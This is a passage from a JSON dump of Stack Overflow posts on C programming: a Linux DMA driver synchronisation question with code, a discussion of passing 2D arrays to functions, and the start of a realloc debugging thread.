    }\n        av_packet_unref(&amp;pkt);\n    }\n\n    av_write_trailer(ofmt_ctx);\nend:\n\n    avformat_close_input(&amp;ifmt_ctx);\n\n    /* close output */\n    if (ofmt_ctx &amp;&amp; !(ofmt-&gt;flags &amp; AVFMT_NOFILE))\n        avio_closep(&amp;ofmt_ctx-&gt;pb);\n    avformat_free_context(ofmt_ctx);\n\n    av_freep(&amp;stream_mapping);\n\n    if (ret &lt; 0 &amp;&amp; ret != AVERROR_EOF) {\n        fprintf(stderr, \"Error occurred: %s\\n\", av_err2str(ret));\n        return 1;\n    }\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "linux", "kernel", "driver"], "owner": {"reputation": 255, "user_id": 8825833, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/51b901da80f75bacf5bf0b6eb7ead307?s=128&d=identicon&r=PG&f=1", "display_name": "John Frye", "link": "https://stackoverflow.com/users/8825833/john-frye"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 454, "favorite_count": 1, "answer_count": 0, "score": 1, "last_activity_date": 1518614885, "creation_date": 1518614885, "question_id": 48788406, "link": "https://stackoverflow.com/questions/48788406/pthread-vs-work-queue-in-linux", "title": "Pthread vs Work Queue in Linux", "body": "<p>I am trying to sync two operations in a Linux driver I have created. In essence, I need to use the DMAEngine to perform functions on two different DMA channels, one that is used for sending data and one used for receiving it. Currently, in my driver, I am able send data from the send channel to the receive channel over DMA. </p>\n\n<p>This internal driver test looks like this </p>\n\n<pre><code>#define TEST_SIZE 1024\n\nstruct dma_proxy_channel_interface {\n    unsigned char buffer[TEST_SIZE];\n    enum proxy_status { PROXY_NO_ERROR = 0, PROXY_BUSY = 1, PROXY_TIMEOUT = 2, PROXY_ERROR = 3 } status;\n    unsigned int length;\n};\n\nstruct dma_proxy_channel {\n    struct dma_proxy_channel_interface *interface_p;    /* user to kernel space interface */\n    dma_addr_t interface_phys_addr;         \n\n    struct device *proxy_device_p;              /* character device support */\n    struct device *dma_device_p;\n    dev_t dev_node;\n    struct cdev cdev;\n    struct class *class_p;\n\n    struct dma_chan *channel_p;             /* dma support */\n    struct completion cmp;\n    dma_cookie_t cookie;\n    dma_addr_t dma_handle;\n    u32 direction;                      /* DMA_MEM_TO_DEV or DMA_DEV_TO_MEM */\n};\n\nstatic struct dma_proxy_channel channels[2];\n\n\nstatic void tx_test(struct work_struct *unused)\n{\n    transfer(&amp;channels[0]);\n}\nstatic void test(void)\n{\n    int i;\n    const int test_size = 1024;\n    struct work_struct work;\n\n    /* Initialize the transmit buffer with a pattern and then start\n     * the seperate thread of control to handle the transmit transfer\n     * since the functions block waiting for the transfer to complete.\n     */\n    for (i = 0; i &lt; test_size; i++) {\n        channels[0].interface_p-&gt;buffer[i] = i;\n    }\n\n    channels[0].interface_p-&gt;length = test_size;\n\n    INIT_WORK(&amp;work, tx_test);\n    schedule_work(&amp;work);\n\n    /* Initialize the receive buffer with zeroes so that we can be sure\n     * the transfer worked, then start the receive transfer.\n     */\n    for (i = 0; i &lt; test_size; i++) {\n        channels[1].interface_p-&gt;buffer[i] = 0;\n    }\n\n    channels[1].interface_p-&gt;length = test_size;\n    transfer(&amp;channels[1]);\n\n    /* Verify the receiver buffer matches the transmit buffer to \n     * verify the transfer was good\n     */\n    for (i = 0; i &lt; test_size; i++) {\n        printk(KERN_INFO \"tx: %d\\trx: %d\\n\", channels[0].interface_p-&gt;buffer[i], channels[1].interface_p-&gt;buffer[i]);\n\n        if (channels[0].interface_p-&gt;buffer[i] !=\n            channels[1].interface_p-&gt;buffer[i])\n            printk(\"buffer not equal, index = %d\\n\", i);\n    }\n}\n</code></pre>\n\n<p>The transfer function includes calls to the DMAEngine that perform not only the transfer but much of the setup for the channel. These functions include dma_map_single, dmaengine_prep_slave_single, setting callback for channel, init_completion, dmaengine_submit, dma_async_issue_pending, wait_for_completion_timeout, and dma_async_is_tx_complete.</p>\n\n<p>From what I understand, these functions need to be executed at nearly the same time for each channel to be ready to interact with the other. Using the work queue in the driver is able to accomplish this.</p>\n\n<p>Now the issue is that when I create a character device driver to do this, each of the channels has their own device file. The structure is such that, an mmap is performed for each channel so that the buffer and length properties of the dma_proxy_channel->interface_p can be set and changed from the user space for each channel. Then an ioctl call is made which essentially takes the private data from the character driver which was set by mmap and pumps it into the transfer function you see called above. Indeed, these calls too must be synced. In the example I received, the author tried to use pthread to sync the ioctl calls. Here is his code.</p>\n\n<pre><code>static struct dma_proxy_channel_interface *tx_proxy_interface_p;\nstatic int tx_proxy_fd;\n/* The following function is the transmit thread to allow the transmit and the \n * receive channels to be operating simultaneously. The ioctl calls are blocking\n * such that a thread is needed.\n */\nvoid *tx_thread()\n{\n    int dummy, i;\n\n    /* Set up the length for the DMA transfer and initialize the transmit\n     * buffer to a known pattern.\n     */\n    tx_proxy_interface_p-&gt;length = TEST_SIZE;\n\n        for (i = 0; i &lt; TEST_SIZE; i++)\n            tx_proxy_interface_p-&gt;buffer[i] = i;\n\n    /* Perform the DMA transfer and the check the status after it completes\n     * as the call blocks til the transfer is done.\n     */\n    printf(\"tx ioctl user space\\n\");\n    ioctl(tx_proxy_fd, 0, &amp;dummy);\n\n    if (tx_proxy_interface_p-&gt;status != PROXY_NO_ERROR)\n        printf(\"Proxy tx transfer error\\n\");\n}\n\n/* The following function uses the dma proxy device driver to perform DMA transfers\n * from user space. This app and the driver are tested with a system containing an\n * AXI DMA without scatter gather and with transmit looped back to receive.\n */\nint main(int argc, char *argv[])\n{   \n    struct dma_proxy_channel_interface *rx_proxy_interface_p;\n    int rx_proxy_fd, i;\n    int dummy;\n    pthread_t tid;\n\n    printf(\"DMA proxy test\\n\");\n\n    /* Step 1, open the DMA proxy device for the transmit and receive channels with\n     * read/write permissions\n     */     \n\n    tx_proxy_fd = open(\"/dev/dma_proxy_tx\", O_RDWR);\n\n    if (tx_proxy_fd &lt; 1) {\n        printf(\"Unable to open DMA proxy device file\\n\");\n        return -1;\n    }\n\n    rx_proxy_fd = open(\"/dev/dma_proxy_rx\", O_RDWR);\n    if (tx_proxy_fd &lt; 1) {\n        printf(\"Unable to open DMA proxy device file\\n\");\n        return -1;\n    }\n\n    /* Step 2, map the transmit and receive channels memory into user space so it's accessible\n     */\n    tx_proxy_interface_p = (struct dma_proxy_channel_interface *)mmap(NULL, sizeof(struct dma_proxy_channel_interface), \n                                    PROT_READ | PROT_WRITE, MAP_SHARED, tx_proxy_fd, 0);\n\n    printf(\"tx_proxy_interface_p: %p\\n\", (void*)tx_proxy_interface_p);\n\n    rx_proxy_interface_p = (struct dma_proxy_channel_interface *)mmap(NULL, sizeof(struct dma_proxy_channel_interface),\n                                    PROT_READ | PROT_WRITE, MAP_SHARED, rx_proxy_fd, 0);\n\n        printf(\"rx_proxy_interface_p: %p\\n\", (void*)rx_proxy_interface_p);\n\n        if ((rx_proxy_interface_p == MAP_FAILED) || (tx_proxy_interface_p == MAP_FAILED)) {\n            printf(\"Failed to mmap\\n\");\n            return -1;\n        }\n\n    /* Create the thread for the transmit processing and then wait a second so the printf output is not \n     * intermingled with the receive processing\n     */\n    pthread_create(&amp;tid, NULL, tx_thread, NULL);    \n    sleep(1);\n\n    /* Initialize the receive buffer so that it can be verified after the transfer is done\n     * and setup the size of the transfer for the receive channel\n     */ \n    for (i = 0; i &lt; TEST_SIZE; i++)\n        rx_proxy_interface_p-&gt;buffer[i] = 0;\n\n        rx_proxy_interface_p-&gt;length = TEST_SIZE;\n    printf(\"rx_proxy_interface_p-&gt;length: %d\\n\", rx_proxy_interface_p-&gt;length); \n    /* Step 3, Perform the DMA transfer and after it finishes check the status \n     */\n\n    printf(\"rx ioctl user space\\n\");\n    ioctl(rx_proxy_fd, 0, &amp;dummy);\n\n    if (rx_proxy_interface_p-&gt;status != PROXY_NO_ERROR)\n        printf(\"Proxy rx transfer error\\n\");\n\n    /* Verify the data recieved matchs what was sent (tx is looped back to tx)\n     */\n    for (i = 0; i &lt; TEST_SIZE; i++) {\n        printf(\"tx: %d\\trx: %d\\n\", tx_proxy_interface_p-&gt;buffer[i], rx_proxy_interface_p-&gt;buffer[i]);\n//          if (tx_proxy_interface_p-&gt;buffer[i] !=\n  //                rx_proxy_interface_p-&gt;buffer[i])\n    //              printf(\"buffer not equal, index = %d\\n\", i);\n        }\n\n    /* Unmap the proxy channel interface memory and close the device files before leaving\n     */\n    munmap(tx_proxy_interface_p, sizeof(struct dma_proxy_channel_interface));\n    munmap(rx_proxy_interface_p, sizeof(struct dma_proxy_channel_interface));\n\n    close(tx_proxy_fd);\n    close(rx_proxy_fd);\n    return 0;\n}\n</code></pre>\n\n<p>You notice he used pthread_create and sleep to try to sync the ioctl calls. Oddly enough, the data for the rx_proxy_interface_p, which is set in the user space before the second ioctl call is not being mapped to the kernel space. When the ioctl call is made, the private data for the character driver associated to that channel has not been changed.</p>\n\n<p>My question is why is it that in the kernel space, the work queue seems  to synchronize the calls to the transfer function for these channels, but in the user space, when using threading, mmapped locations in the kernel space are not being changed? What performance differences should I expect to see between using the work queue and threading libraries?</p>\n"}, {"tags": ["c", "arrays", "pointers"], "comments": [{"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 2, "creation_date": 1518613956, "post_id": 48788073, "comment_id": 84577714, "body": "Where is the code that uses a 2d array?"}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 2, "creation_date": 1518613982, "post_id": 48788073, "comment_id": 84577736, "body": "Show us your unsuccessful attempt so we can see where the mistake is."}, {"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 0, "creation_date": 1518614010, "post_id": 48788073, "comment_id": 84577756, "body": "I&#39;m guessing you tried <code>int**</code> and got blocked by your wise compiler?"}], "answers": [{"comments": [{"owner": {"reputation": 406, "user_id": 7525424, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/e8eeab8ea6a4369def5951a524f17de8?s=128&d=identicon&r=PG&f=1", "display_name": "Aemilius", "link": "https://stackoverflow.com/users/7525424/aemilius"}, "edited": false, "score": 0, "creation_date": 1518614062, "post_id": 48788131, "comment_id": 84577796, "body": "By doing what you suggested, I will only pass the array to the function, not the pointer to the array."}, {"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "reply_to_user": {"reputation": 406, "user_id": 7525424, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/e8eeab8ea6a4369def5951a524f17de8?s=128&d=identicon&r=PG&f=1", "display_name": "Aemilius", "link": "https://stackoverflow.com/users/7525424/aemilius"}, "edited": false, "score": 4, "creation_date": 1518614091, "post_id": 48788131, "comment_id": 84577809, "body": "@Aemilius - Wanna bet?"}, {"owner": {"reputation": 3792, "user_id": 1488067, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/8JllV.jpg?s=128&g=1", "display_name": "Lou", "link": "https://stackoverflow.com/users/1488067/lou"}, "reply_to_user": {"reputation": 406, "user_id": 7525424, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/e8eeab8ea6a4369def5951a524f17de8?s=128&d=identicon&r=PG&f=1", "display_name": "Aemilius", "link": "https://stackoverflow.com/users/7525424/aemilius"}, "edited": false, "score": 0, "creation_date": 1518614222, "post_id": 48788131, "comment_id": 84577890, "body": "@Aemilius: then the code in your question also passes the one-dimensional array, instead of a pointer?"}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "reply_to_user": {"reputation": 406, "user_id": 7525424, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/e8eeab8ea6a4369def5951a524f17de8?s=128&d=identicon&r=PG&f=1", "display_name": "Aemilius", "link": "https://stackoverflow.com/users/7525424/aemilius"}, "edited": false, "score": 0, "creation_date": 1518614649, "post_id": 48788131, "comment_id": 84578144, "body": "@Aemilius What StoryTeller is saying is that arrays in C are passed as an actual pointer.  The reason why multi-dimensional arrays require the additional annotations such as <code>int arr[][10]</code> (note that only the first <code>[]</code> can be empty) is so the compiler can properly dereference the single pointer passed."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 406, "user_id": 7525424, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/e8eeab8ea6a4369def5951a524f17de8?s=128&d=identicon&r=PG&f=1", "display_name": "Aemilius", "link": "https://stackoverflow.com/users/7525424/aemilius"}, "edited": false, "score": 0, "creation_date": 1518617239, "post_id": 48788131, "comment_id": 84579934, "body": "@Aemilius By language design, you cannot pass arrays by value to a function."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1518617303, "post_id": 48788131, "comment_id": 84579987, "body": "I would avoid the obscure <code>[*]</code> syntax, as the type will have to be completed at the function definition anyway. Better to use the proper, explicit bounds in both the declaration and the definition."}, {"owner": {"reputation": 96743, "user_id": 2455888, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/MQu4W.png?s=128&g=1", "display_name": "haccks", "link": "https://stackoverflow.com/users/2455888/haccks"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1518618211, "post_id": 48788131, "comment_id": 84580640, "body": "@Lundin; Just listed the different possibilities."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1518618679, "post_id": 48788131, "comment_id": 84580974, "body": "Well there&#39;s also <code>int arr[1][n]</code> and <code>int arr[*][n]</code> and <code>int arr[n-INT_MAX-1][n]</code> and <code>int arr[static const 666][n]</code> and... but that doesn&#39;t mean we should be using them :)"}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1519590720, "post_id": 48788131, "comment_id": 84961331, "body": "It&#39;s not clear from your answer, but in the function definition, you have to use the <code>[n]</code> versions and not the <code>[*]</code> versions. IMO it would be better to not even mention the <code>*</code> version"}], "tags": [], "owner": {"reputation": 96743, "user_id": 2455888, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/MQu4W.png?s=128&g=1", "display_name": "haccks", "link": "https://stackoverflow.com/users/2455888/haccks"}, "is_accepted": false, "score": 2, "last_activity_date": 1519609314, "last_edit_date": 1519609314, "creation_date": 1518614015, "answer_id": 48788131, "question_id": 48788073, "link": "https://stackoverflow.com/questions/48788073/what-syntax-should-i-use-in-the-header-of-a-function-taking-a-two-dimensional-ar/48788131#48788131", "title": "What syntax should I use in the header of a function taking a two dimensional array as an argument in C", "body": "<p>You can pass two dimensional array (actually a pointer to an array of arrays) to a function by declaring any of function prototypes  </p>\n\n<pre><code>void foo1(int arr[][10]);\nvoid foo2(int (*arr)[10]); \n</code></pre>\n\n<p>For C99 and latter these will also work  </p>\n\n<pre><code>void foo3(int n, int arr[][n]);\nvoid foo4(int n, int (*arr)[n]); \n</code></pre>\n\n<p>Then call your function   </p>\n\n<pre><code>int arr[5][10] = { /*...*/ };\n// code ... \nfoo1(arr);\nfoo3(10, arr);\n// code ...\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": true, "score": 2, "last_activity_date": 1518618066, "creation_date": 1518618066, "answer_id": 48789421, "question_id": 48788073, "link": "https://stackoverflow.com/questions/48788073/what-syntax-should-i-use-in-the-header-of-a-function-taking-a-two-dimensional-ar/48789421#48789421", "title": "What syntax should I use in the header of a function taking a two dimensional array as an argument in C", "body": "<p>First you have to realize that <code>void foo(int array[x])</code> and <code>void foo(int* array)</code> are 100% equivalent, because when you use the array syntax as part of a function parameter, it gets silently adjusted by the C compiler into a pointer to the first element. This is the reason why your original code works.</p>\n\n<p>When using 2D arrays, there's no difference: you would write <code>void foo(int array[x][y])</code>. This too gets adjusted to a pointer to the first element. As it turns out, C does not actually support 2D arrays - what we have here is <em>an array of arrays of int</em>. The first element of an array of arrays of int, is an array of int.</p>\n\n<p>How do we write a pointer to an array  of int then? With the <em>array pointer</em> syntax: <code>int(*)[y]</code>. You can think of it as if this pointer points at \"the whole array\".</p>\n\n<p>And this is the reason why we get away with writing things like <code>void foo(int array[][y]);</code> - the inner-most dimension doesn't matter, since the parameter will get adjusted to an array pointer anyway.</p>\n\n<p>C is deliberately designed this way to make functions match the rule of \"array decay\", which means that whenever an array name is used in an expression, it \"decays\" into a pointer to the first element. And this also makes it impossible to pass an array by value.</p>\n\n<p>Example:</p>\n\n<pre><code>void foo(int array[2][5]) {\n    //CODE\n}\n\nint main() {\n    int test[2][5] = \n    {\n      {0, 1, 2, 3, 4},\n      {0, 1, 2, 3, 4}\n    };\n\n    foo(test);\n    return 0;\n}\n</code></pre>\n\n<p>Where all of these</p>\n\n<pre><code>void foo(int array[2][5])\nvoid foo(int array[][5])\nvoid foo(int array[666][5])\n</code></pre>\n\n<p>get silently adjusted by the compiler to be the same as</p>\n\n<pre><code>void foo(int (*array)[5]) \n</code></pre>\n"}], "owner": {"reputation": 406, "user_id": 7525424, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/e8eeab8ea6a4369def5951a524f17de8?s=128&d=identicon&r=PG&f=1", "display_name": "Aemilius", "link": "https://stackoverflow.com/users/7525424/aemilius"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 116, "favorite_count": 1, "accepted_answer_id": 48789421, "answer_count": 2, "score": -1, "last_activity_date": 1559502849, "creation_date": 1518613864, "last_edit_date": 1519589075, "question_id": 48788073, "link": "https://stackoverflow.com/questions/48788073/what-syntax-should-i-use-in-the-header-of-a-function-taking-a-two-dimensional-ar", "title": "What syntax should I use in the header of a function taking a two dimensional array as an argument in C", "body": "<p>I want to create a function that takes in the pointer to a two dimensional array that will modify the elements of this array. <br>\nWhen I want to do the same thing with a one dimensional array, the thing is simple - I simply use the name of this array</p>\n\n<pre><code>void foo(int *array) {\n    //CODE\n}\n\nint main() {\n    int test[5] = {0, 1, 2, 3, 4};\n    foo(test);\n    return 0;\n}\n</code></pre>\n\n<p>But what can I do in terms of two dimensional arrays? I tried to use this syntax: <br></p>\n\n<pre><code>#include &lt;stdio.h&gt;\nvoid foo(int array[][]) {\n    printf(\"%d\", array[0][0]);\n}\n\nint main(void) {\n    int array[2][2];\n    array[0][0] = 3;\n    foo(array);\n}\n</code></pre>\n\n<p>but it did not work. Why is it not possible ot use this? How are two dimensional arrays treated in C?</p>\n"}, {"tags": ["c", "arrays", "pointers", "tree", "valgrind"], "comments": [{"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1518613873, "post_id": 48788002, "comment_id": 84577663, "body": "There is not enough code. Please post a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>, emphasis on Minimal."}, {"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "edited": false, "score": 0, "creation_date": 1518614656, "post_id": 48788002, "comment_id": 84578152, "body": "A general caveat on <code>realloc()</code>... if the new memory block allocation fails, <code>realloc()</code> returns <code>NULL</code>. If you assign the returned pointer to the old one like you did, and <code>realloc()</code> fails, you lost the pointer to the old, still-allocated memory (which you then cannot <code>free()</code>)."}, {"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "edited": false, "score": 0, "creation_date": 1518614913, "post_id": 48788002, "comment_id": 84578333, "body": "Errr.... you can only call <code>realloc()</code> on a pointer that was returned from a previous call to <code>*alloc()</code>. I don&#39;t see you allocating <code>nodes[id].label</code> anywhere, you just <code>realloc()</code> it...?"}, {"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "edited": false, "score": 0, "creation_date": 1518614937, "post_id": 48788002, "comment_id": 84578351, "body": "Is memory every allocated for the member: <code>struct node  **children;</code> ?"}, {"owner": {"reputation": 111, "user_id": 7123410, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/31b07f4a51ba2f420336f650c96bc5d4?s=128&d=identicon&r=PG&f=1", "display_name": "Ollu_", "link": "https://stackoverflow.com/users/7123410/ollu"}, "reply_to_user": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "edited": false, "score": 0, "creation_date": 1518615483, "post_id": 48788002, "comment_id": 84578702, "body": "@ryyker I didn&#39;t actually need that line of code, that was left over from a previous program I made"}, {"owner": {"reputation": 111, "user_id": 7123410, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/31b07f4a51ba2f420336f650c96bc5d4?s=128&d=identicon&r=PG&f=1", "display_name": "Ollu_", "link": "https://stackoverflow.com/users/7123410/ollu"}, "reply_to_user": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "edited": false, "score": 0, "creation_date": 1518615573, "post_id": 48788002, "comment_id": 84578761, "body": "@DevSolar isn&#39;t it allocated when I <code>realloc()</code> in grow array?"}, {"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "edited": false, "score": 0, "creation_date": 1518615581, "post_id": 48788002, "comment_id": 84578769, "body": "@Ollu_, then please clean up the post to make the code you are showing relevant to the problem at hand. Create a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>"}, {"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "reply_to_user": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "edited": false, "score": 0, "creation_date": 1518615710, "post_id": 48788002, "comment_id": 84578867, "body": "@DevSolar - <code>calloc</code> is called in this line: <code>TREE *nodes = (TREE *)calloc(SIZE, sizeof(NODE));</code>.  but, no further initializations are made."}, {"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "edited": false, "score": 0, "creation_date": 1518615762, "post_id": 48788002, "comment_id": 84578908, "body": "@Ollu_: I did not analyze your code in detail. But the fact that <code>nodes[].label</code> is <b>only</b> mentioned in context of <b>re</b>alloc() makes me think that it <i>originally</i> is pointing into a <i>block</i> of memory, or worse yet, not pointing anywhere (uninitialized). If you call <code>realloc()</code> on anything that has <b>not</b> been returned by a previous call to <code>malloc()</code>, <code>calloc()</code> or <code>realloc()</code>, you are into undefined behaviour."}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "reply_to_user": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "edited": false, "score": 0, "creation_date": 1518615968, "post_id": 48788002, "comment_id": 84579034, "body": "@DevSolar you can realloc a null pointer."}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1518616129, "post_id": 48788002, "comment_id": 84579161, "body": "Your problem is in processFile, not in a dynamic resize. processFile overruns the buffer."}, {"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "reply_to_user": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1518616141, "post_id": 48788002, "comment_id": 84579175, "body": "@n.m.: Ah. Right. Well... {retreats into a corner}"}, {"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "edited": false, "score": 0, "creation_date": 1518616602, "post_id": 48788002, "comment_id": 84579518, "body": "...And of course processFile is <i>not included</i> in the posted code. ( @Ollu_/ )"}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1518616991, "post_id": 48788002, "comment_id": 84579763, "body": "<code>typedef NODE TREE;</code>??? That&#39;s confusing.  At best.  Because a &quot;tree&quot; seems like it should be able to have many &quot;nodes&quot;."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1518617173, "post_id": 48788002, "comment_id": 84579893, "body": "And if you&#39;re going to ignore the <code>int</code> return code from <code>processFile</code>, just have it return the <code>FILE *</code> and not bother with the indirection of <code>FILE **fp</code>,"}], "answers": [{"comments": [{"owner": {"reputation": 111, "user_id": 7123410, 